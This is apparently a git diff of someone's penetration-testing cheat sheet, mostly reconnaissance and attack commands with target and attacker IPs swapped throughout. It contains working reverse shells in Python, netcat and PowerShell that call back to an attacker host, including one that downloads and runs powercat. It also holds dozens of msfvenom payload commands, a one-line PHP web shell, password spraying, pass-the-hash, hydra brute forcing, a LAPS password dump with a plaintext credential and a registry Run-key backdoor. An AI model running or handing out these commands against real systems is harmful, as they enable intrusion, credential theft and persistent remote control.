@@ -1,28 +1,35 @@
 ---
-Target IP: 192.168.142.58
-Attacker IP: 192.168.45.205
+Target IP: 10.10.110.164
+Attacker IP: 10.11.114.221
 ---
 #### nmap Command
 ```bash
+ping -c 4 10.10.110.164
 # Ping sweep scan
-nmap -sn 192.168.142.58
+nmap -sn 10.10.110.164
 # This will do the ping scan instead of ARP on port 80
-nmap -sn -PS 192.168.142.58
+nmap -sn -PS 10.10.110.164
 # We can also specify the port or port range
-nmap -sn -PS22 192.168.142.58
-nmap -sn -PS1-1000 192.168.142.58
+nmap -sn -PS22 10.10.110.164
+nmap -sn -PS1-1000 10.10.110.164
 
-# 1. Default port scan with version detection and default script findings
-nmap -sCV --min-rate=1000 -T4 192.168.142.58 -v -oN nmap-initial.log
-# 2. All port scan
-nmap -p- --min-rate=1000 -T4 -Pn 192.168.142.58 -v -oN nmap-all-ports.log
-# 3. Create ports variable in shell from the all port scan result 
+# Default port scan with version detection and default script findings
+nmap -sCV --min-rate=1000 -T4 10.10.110.164 -v -oN nmap-initial.log
+
+## 1. All port scan | add -Pn if needed 
+# -Pn: Skips host discovery; assumes the host is online.
+nmap -p- --min-rate=1000 -T4 10.10.110.164 -v -oN nmap-all-ports.log
+
+## 2. Create ports variable in shell from the all port scan result 
 ports=$(cat nmap-all-ports.log | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
-# 4. Launch version detection and script scan with the all port scan result
-nmap -p$ports -sCVS 192.168.142.58 -v -oN nmap-services.log
+
+## 3. Launch version detection and script scan with the all port scan result
+# -sS: SYN (Stealth) scan | Normal flow SYN - SYNACK - ACK
+# Stealth flow SYN-SYNACK-RST
+nmap -p$ports -sCV 10.10.110.164 -v -oN nmap-services.log
 
 # Best practice scan for UDP ports as well
-sudo nmap -Pn -n 192.168.142.58 -sU --top-ports=100 --reason
+sudo nmap -Pn -n 10.10.110.164 -sU --top-ports=100 --reason
 
 # To use Nmap to determine the best service name, you can use the -sV command to perform a service and version detection scan:
 nmap 192.168.1.1 -sV
@@ -39,35 +46,57 @@ nmap 192.168.1.1 -sV -version-all
 #### Network File Share (NFS) Enum
 ```bash
 # Nmap with NFS Scripts
-nmap --script=nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse -p 2049 192.168.142.58
+nmap --script=nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse -p 2049 10.10.110.164
 ```
 #### DNS Enum
 ```bash
 # DNS Zone transfer
-dig @192.168.142.58 axfr <dns_name>
+dig @10.10.110.164 axfr <dns_name>
 
 # dns enum
-dnsenum 192.168.142.58
+dnsenum 10.10.110.164
 ```
 #### SMB Enum
 ```bash
-nmap -script=smb-vuln\* -p445 192.168.142.58
+nmap -script=smb-vuln\* -p445 10.10.110.164
 
-enum4linux -a 192.168.142.58 
+enum4linux -a 10.10.110.164 
 # Enumerate using login credentials:
-enum4linux -u user_name -p password 192.168.142.58
+enum4linux -u user_name -p password 10.10.110.164
 # Enumerate user list:
-enum4linux -U 192.168.142.58
+enum4linux -U 10.10.110.164
   
-smbclient -N -L //192.168.142.58//
+smbclient -N -L //10.10.110.164//
 # Connect with a username:
-smbclient //192.168.142.58/share -U username
+smbclient //10.10.110.164/share -U username
 # Connect with a workgroup:
-smbclient //192.168.142.58/share --workgroup domain -U username
+smbclient //10.10.110.164/share --workgroup domain -U username
 # Connect with a username and password:
-smbclient //192.168.142.58/share -U username%password
+smbclient //10.10.110.164/share -U username%password
   
-crackmapexec smb 192.168.142.58 --shares
+crackmapexec smb 10.10.110.164 --shares
+```
+
+#### Crackmapexec
+```bash
+# General help
+crackmapexec --help
+# Protocol help
+cracmapexec smb --help
+
+# Null session
+crackmapexec smb 10.10.110.164 -u "" up ""
+# Connect to target using local account
+crackmapexec smb 10.10.110.164 -u 'Administrator' -p 'PASSWORD' --local-auth
+# Pass the hash against a subnet
+crackmapexec smb 10.10.110.164 -u administrator -H 'LMHASH:NTHASH' --local-auth
+crackmapexec smb 10.10.110.164 -u administrator -H 'NTHASH'
+# Bruteforcing and Password Spraying
+crackmapexec smb 10.10.110.164 -u "admin" -p "password1"
+crackmapexec smb 10.10.110.164 -u "admin" -p "password1" "password2"
+crackmapexec smb 10.10.110.164 -u "admin1" "admin2" -p "P@ssword"
+crackmapexec smb 10.10.110.164 -u user_file.txt -p pass_file.txt
+crackmapexec smb 10.10.110.164 -u user_file.txt -H ntlm_hashFile.txt
 ```
 #### Gobuster
 ```bash
@@ -77,42 +106,46 @@ crackmapexec smb 192.168.142.58 --shares
 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
 # Directory fuzzing dirlist - common
-gobuster dir -u http://192.168.142.58 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt
+gobuster dir -u http://10.10.110.164 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt
 # Directory fuzzing dirlist - raft small
-gobuster dir -u http://192.168.142.58 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster-v2-80.log -t 42 -b 400,404 --no-error -x php,html,txt
+gobuster dir -u http://10.10.110.164 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster-v2-80.log -t 42 -b 400,404 --no-error -x php,html,txt
 # Directory fuzzing dirlist - big
-gobuster dir -u http://192.168.142.58 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt
+gobuster dir -u http://10.10.110.164 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt
 # Directory fuzzing dirlist - dir 2.3 medium
-gobuster dir -u http://192.168.142.58 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt
+gobuster dir -u http://10.10.110.164 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt
 
 # without many options
-gobuster dir -u http://192.168.142.58 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-80.log
+gobuster dir -u http://10.10.110.164 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-80.log
 # Exclude length
-gobuster dir -u http://192.168.142.58 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt --exclude-length <LENGTH> -o gobuster-v2-80.log
+gobuster dir -u http://10.10.110.164 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt --exclude-length <LENGTH> -o gobuster-v2-80.log
 
 # Subdomain fuzzing
-gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://192.168.142.58
+gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.110.164
 ```
 
 #### LDAP Enum
 ```bash
 #If LDAP running some LDAP related `nmap` scripts to enumerate
-nmap -n -sV --script "ldap* and not brute" 192.168.142.58
+nmap -n -sV --script "ldap* and not brute" 10.10.110.164
 
 # we can run LDAP search with the naming context included to enumerate users and grep by SAM account name.
-ldapsearch -x -H "ldap://192.168.142.58" -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName
+ldapsearch -x -H "ldap://10.10.110.164" -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName
 
 # Its possible that LAPS or LDAP has been misconfigured enough to potentially contains the computer passwords for computer object in AD. Knowing this we can go back and search LDAP with the credentials with have specifically looking for the _ms-Mcs-AdmPwd attribute.
-ldapsearch -x -H "ldap://192.168.142.58" -D 'domain\username' -w 'password' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 
+ldapsearch -x -H "ldap://10.10.110.164" -D 'domain\username' -w 'password' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 
 
 # Dumping the LAPS Password with crackmapexec
 crackmapexec ldap 192.168.219.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.219.122 -M laps
 ```
 #### Rev Shell
 ```bash
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.205 LPORT=4444 -f elf -o shell
+python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.11.114.221\",445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"
 
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.205 LPORT=4445 -f exe-service -o rev-svc.exe
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.11.114.221 LPORT=4444 -f elf -o shell
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.114.221 LPORT=4445 -f exe -o rev.exe
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.114.221 LPORT=4445 -f exe-service -o rev-svc.exe
 
 # php revshell smallest
 <?=`$_GET[cmd]`?>
@@ -121,10 +154,10 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.205 LPORT=4445 -f exe
 netstat -ano
 
 # nc revshell stealth
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.205 5554 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.114.221 5554 >/tmp/f
 
 # windows rev shell with powercat
-powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.205/powercat.ps1');powercat -c 192.168.45.205 -p 4444 -e cmd"
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.11.114.221/powercat.ps1');powercat -c 10.11.114.221 -p 4444 -e cmd"
 ```
 #### MySQL with web app RCE
 ```bash
@@ -175,36 +208,36 @@ wfuzz -c -w /path/to/wordlist.txt -p 127.0.0.1:8080 http://example.com/FUZZ
 #### dirsearch
 ```bash
 # Top command 
-dirsearch -u http://192.168.142.58 -e php,html -x 400,500 -r -t 8 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+dirsearch -u http://10.10.110.164 -e php,html -x 400,500 -r -t 8 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
 # -e for specific extension comma seperated 
 # -x to exclude status code 
 # -r recursive to 1 level 
 # -t thread count 
 # Perform a basic scan against a target URL 
-dirsearch -u http://192.168.142.58 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 403  
+dirsearch -u http://10.10.110.164 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 403  
 # Use a custom wordlist for directory and file brute-forcing: 
-dirsearch -u http://192.168.142.58 -w /path/to/wordlist.txt 
+dirsearch -u http://10.10.110.164 -w /path/to/wordlist.txt 
 # Specify file extensions to look for during the scan: 
-dirsearch -u http://192.168.142.58 -e php,txt,html 
+dirsearch -u http://10.10.110.164 -e php,txt,html 
 # Recursively scan subdirectories for directories and files:
-dirsearch -u http://192.168.142.58 -r
+dirsearch -u http://10.10.110.164 -r
 # Save scan results to a file: 
-dirsearch -u http://192.168.142.58 -o dirseacrh.txt 
+dirsearch -u http://10.10.110.164 -o dirseacrh.txt 
 # Specify custom HTTP headers for the requests: 
-dirsearch -u http://192.168.142.58 -H "User-Agent: Mozilla/5.0"
+dirsearch -u http://10.10.110.164 -H "User-Agent: Mozilla/5.0"
 ```
 #### hydra
 ```bash
 # Basic command
-hydra -l <username> -P /usr/share/wordlists/rockyou.txt <protocol>://192.168.142.58 -t 4
+hydra -l <username> -P /usr/share/wordlists/rockyou.txt <protocol>://10.10.110.164 -t 4
 
 # For FTP
-hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <protocol>://192.168.142.58 -t 4
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <protocol>://10.10.110.164 -t 4
 
 # -t :: Number of thread followed by the number
 
 # Post web login forms
-hydra -l <username> -P /usr/share/wordlists/rockyou.txt 192.168.142.58 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
+hydra -l <username> -P /usr/share/wordlists/rockyou.txt 10.10.110.164 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
 
 # -L :: for username file
 # -l :: for username as string
@@ -218,7 +251,7 @@ hydra -l <username> -P /usr/share/wordlists/rockyou.txt 192.168.142.58 http-post
 # -u : rotate around usernames, not passwords
 # -P : passwords list
 
-hydra -I -V -f -L usernames.txt -u -P /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt 192.168.142.58 ftp
+hydra -I -V -f -L usernames.txt -u -P /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt 10.10.110.164 ftp
 ```
 #### Netcat with rlwrap
 ```bash
@@ -243,7 +276,7 @@ systemctl cat service_name
 ```
 #### Shell Stabilization
 ```bash
-1. python -c 'import pty;pty.spawn("/bin/bash")' 
+1. python3 -c 'import pty;pty.spawn("/bin/bash")' 
 2. export TERM=xterm
 3. CTRL+Z 
 4. stty raw -echo;fg
@@ -260,7 +293,6 @@ hashcat hash /usr/share/wordlists/rockyou.txt -m 1600
 #### find Command
 ```bash
 # To search a file
-find / -type f -name file-to-search
 find /path/ -type f -name file-to-search
 
 # To search the local.txt file and exclude permission denied output
@@ -317,16 +349,16 @@ cat /etc/passwd | grep bash
 #### Windows Priv Esc
 ```powershell
 # if port 135 rpc (remote procedure call) is open then we can try below commands to interact with the process
-rpcclient -U '' -N 192.168.142.58
+rpcclient -U '' -N 10.10.110.164
 
 # set path if it set to something else check with echo %PATH%
 set PATH=%PATH%;C:\windows\system32;C:\windows;C:\windows\System32\Wbem;C:\windows\System32\WindowsPowerShell\v1.0\;C:\windows\System32\OpenSSH\;C:\Program Files\dotnet\
 
 # connect to rdp running of port
-rdesktop 192.168.142.58
+rdesktop 10.10.110.164
 
 # To download file in windows
-certutil -urlcache -f http://192.168.45.205 path-output-file-name
+certutil -urlcache -f http://10.11.114.221 path-output-file-name
 
 # windows RDP from linux using xfreerdp
 xfreerdp /v:IP /u:USER /p:PASSWORD /cert:ignore /dynamic-resolution
@@ -414,8 +446,8 @@ schtasks /run /tn <taskname>
 net user username
 
 # Generate a malicious .msi or .exe file using msfvenom
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.205 LPORT=LOCAL_PORT -f msi -o malicious.msi
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.205 LPORT=4445 -f exe-service -o rev-svc.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.114.221 LPORT=LOCAL_PORT -f msi -o malicious.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.114.221 LPORT=4445 -f exe-service -o rev-svc.exe
 
 # Run the installer with the command
 msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
@@ -516,16 +548,16 @@ c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKE
 # The -p parameter specifies the executable to be run by the exploit, which is nc64.exe in this case. The -a parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be -e cmd.exe ATTACKER_IP 4442.
 
 # Windows Staged reverse TCP
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.205 LPORT=4242 -f exe > reverse.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.114.221 LPORT=4242 -f exe > reverse.exe
 
 # Windows Stageless reverse TCP
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.205 LPORT=4242 -f exe > reverse.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.114.221 LPORT=4242 -f exe > reverse.exe
 
 # Linux Staged reverse TCP
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.45.205 LPORT=4242 -f elf >reverse.elf
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.114.221 LPORT=4242 -f elf >reverse.elf
 
 # Linux Stageless reverse TCP
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.205 LPORT=4242 -f elf >reverse.elf
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.114.221 LPORT=4242 -f elf >reverse.elf
 
 # add a backdoor in regsitry
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersions\Run" /v shell /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
@@ -533,16 +565,16 @@ reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersions\Run" /v sh
 reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersions\Run" /v shell
 
 # Other platforms
-$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.45.205 LPORT=4242 -f elf > shell.elf
-$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.205 LPORT=4242 -f exe > shell.exe
-$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.45.205 LPORT=4242 -f macho > shell.macho
-$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.205 LPORT=4242 -f asp > shell.asp
-$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.45.205 LPORT=4242 -f raw > shell.jsp
-$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.45.205 LPORT=4242 -f war > shell.war
-$ msfvenom -p cmd/unix/reverse_python LHOST=192.168.45.205 LPORT=4242 -f raw > shell.py
-$ msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.205 LPORT=4242 -f raw > shell.sh
-$ msfvenom -p cmd/unix/reverse_perl LHOST=192.168.45.205 LPORT=4242 -f raw > shell.pl
-$ msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.45.205 LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.114.221 LPORT=4242 -f elf > shell.elf
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.114.221 LPORT=4242 -f exe > shell.exe
+$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.11.114.221 LPORT=4242 -f macho > shell.macho
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.114.221 LPORT=4242 -f asp > shell.asp
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.114.221 LPORT=4242 -f raw > shell.jsp
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.114.221 LPORT=4242 -f war > shell.war
+$ msfvenom -p cmd/unix/reverse_python LHOST=10.11.114.221 LPORT=4242 -f raw > shell.py
+$ msfvenom -p cmd/unix/reverse_bash LHOST=10.11.114.221 LPORT=4242 -f raw > shell.sh
+$ msfvenom -p cmd/unix/reverse_perl LHOST=10.11.114.221 LPORT=4242 -f raw > shell.pl
+$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.11.114.221 LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 
 ```
 #### PHP Apache2 log poisoning
@@ -648,10 +680,10 @@ smbclient //server/share -U username -c 'chmod 755 file'
 #### SMBMap
 ```bash
 # Scan a single host for SMB shares
-smbmap -H 192.168.142.58
+smbmap -H 10.10.110.164
 
 # For anonymous/guest access
-smbmap -u 'guest' -p '' -H 192.168.142.58
+smbmap -u 'guest' -p '' -H 10.10.110.164
 
 # Scan multiple hosts for SMB shares from a file
 smbmap -H <target_ip_file.txt>
@@ -660,52 +692,52 @@ smbmap -H <target_ip_file.txt>
 ########################
 
 # Scan with username and password
-smbmap -H 192.168.142.58 -u <username> -p <password>
+smbmap -H 10.10.110.164 -u <username> -p <password>
 
 # Scan with username and prompt for password
-smbmap -H 192.168.142.58 -u <username>
+smbmap -H 10.10.110.164 -u <username>
 
 # Scan with NTLM hash
-smbmap -H 192.168.142.58 -u <username> -H <NTLM_hash>
+smbmap -H 10.10.110.164 -u <username> -H <NTLM_hash>
 
 # Scan with Kerberos ticket
-smbmap -H 192.168.142.58 --kerberos
+smbmap -H 10.10.110.164 --kerberos
 ```
 #### Crackmapexec
 ```bash
 # SMB enumeration
-crackmapexec smb 192.168.142.58 -u guest -p '' --shares
+crackmapexec smb 10.10.110.164 -u guest -p '' --shares
 
 # To check the valid user and hashesh, we can use crackmapexec
-crackmapexec winrm 192.168.142.58 -u <username file> -H <hash file>
+crackmapexec winrm 10.10.110.164 -u <username file> -H <hash file>
 
 ```
 #### Wpscan
 ```shell
 # Enumerate WordPress version
-wpscan --url http://192.168.142.58 --enumerate v
+wpscan --url http://10.10.110.164 --enumerate v
 # Scan with API token
-wpscan --url http://192.168.142.58 --api-token <your_api_token>
+wpscan --url http://10.10.110.164 --api-token <your_api_token>
 # HTTP basic authentication
-wpscan --url http://192.168.142.58 --http-auth <username>:<password>
+wpscan --url http://10.10.110.164 --http-auth <username>:<password>
 # Enumerate plugins, themes, and users
-wpscan --url http://192.168.142.58 --enumerate p,t,u --plugins-detection aggressive
+wpscan --url http://10.10.110.164 --enumerate p,t,u --plugins-detection aggressive
 # Brute force usernames
-wpscan --url http://192.168.142.58 --enumerate u --passwords <password_list>
+wpscan --url http://10.10.110.164 --enumerate u --passwords <password_list>
 # Brute force passwords for a specific user
-wpscan --url http://192.168.142.58 -U <username> -P <password_list>
+wpscan --url http://10.10.110.164 -U <username> -P <password_list>
 # Scan with a proxy
-wpscan --url http://192.168.142.58 --proxy <proxy_ip:port>
+wpscan --url http://10.10.110.164 --proxy <proxy_ip:port>
 # Scan for known vulnerabilities
-wpscan --url http://192.168.142.58 --enumerate vp
+wpscan --url http://10.10.110.164 --enumerate vp
 # Enumerate plugins with vulnerability checks
-wpscan --url http://192.168.142.58 --api-token YOUR_API_TOKEN --enumerate vp
+wpscan --url http://10.10.110.164 --api-token YOUR_API_TOKEN --enumerate vp
 # Brute force usernames
-wpscan --url http://192.168.142.58 --enumerate u --passwords /path/to/passwords.txt
+wpscan --url http://10.10.110.164 --enumerate u --passwords /path/to/passwords.txt
 # Brute force password for a specific user
-wpscan --url http://192.168.142.58 -U admin -P /path/to/passwords.txt
+wpscan --url http://10.10.110.164 -U admin -P /path/to/passwords.txt
 # Scan using an HTTP proxy
-wpscan --url http://192.168.142.58 --proxy 127.0.0.1:8080
+wpscan --url http://10.10.110.164 --proxy 127.0.0.1:8080
 ```
 
 #### LXD Group Access Priv Esc
